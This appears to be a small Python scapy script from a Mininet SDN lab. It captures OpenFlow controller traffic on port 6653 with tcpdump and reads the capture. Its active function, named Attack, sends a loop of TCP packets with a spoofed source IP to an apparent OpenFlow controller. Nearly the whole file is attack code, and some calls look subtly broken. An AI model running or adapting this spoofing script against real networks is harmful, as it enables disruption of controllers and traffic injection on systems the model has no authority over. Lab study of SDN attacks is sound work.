import os
import time
import json
from scapy.all import *

def Sunny():
    user_input = os.system("sudo tcpdump -i eth0 port 6653 -c40 -w objective_5.pcap")

def Bajaj():
    a = rdpcap("/home/mininet/objective_5.pcap")
    b = a[2]['IP'].src
    c = a[2]['TCP'].sport
    print(b, c)
   # d = Ether()/IP(dst="192.168.215.8", src="192.168.215.7")/TCP(sport=9999, dport=6653, seq=1)/openflow.OFPTPacketIn()
   # sendp(d)
def Attack():
    for i in range(1, 100):
        d = sendp(IP(dst="192.168.215.8", src="192.168.215.7")/TCP(sport=9999, dport=6653, seq=i))
if __name__ == "__main__":
   # Sunny()
   # Bajaj()
    Attack()
